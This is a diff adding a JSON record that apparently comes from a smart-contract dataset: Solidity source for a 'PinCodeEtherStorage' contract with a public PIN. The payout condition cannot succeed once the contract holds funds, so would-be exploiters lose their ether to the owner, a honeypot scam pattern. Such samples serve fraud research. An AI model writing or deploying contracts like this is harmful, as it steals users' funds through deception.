@@ -1,0 +1,6 @@
+{
+	"Language": "Solidity",
+	"Source": "pragma solidity ^0.4.19;\r\ncontract PinCodeEtherStorage {\r\n\t// Store some money with a 4 digit code\r\n\t\r\n    address private Owner = msg.sender;\r\n    uint public PinCode = 2658;\r\n\r\n    function() public payable {}\r\n    function PinCodeEtherStorage() public payable {}\r\n   \r\n    function Withdraw() public {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }\r\n    \r\n    function Take(uint n) public payable {\r\n\t\tif(msg.value >= this.balance && msg.value > 0.1 ether)\r\n\t\t\t// To prevent random guesses, you have to send some money\r\n\t\t\t// Random Guess = money lost\r\n\t\t\tif(n <= 9999 && n == PinCode)\r\n\t\t\t\tmsg.sender.transfer(this.balance+msg.value);\r\n    }\r\n}",
+	"ContractName": "PinCodeEtherStorage",
+	"CompilerVersion": "v0.4.19+commit.c4cbbb05"
+}
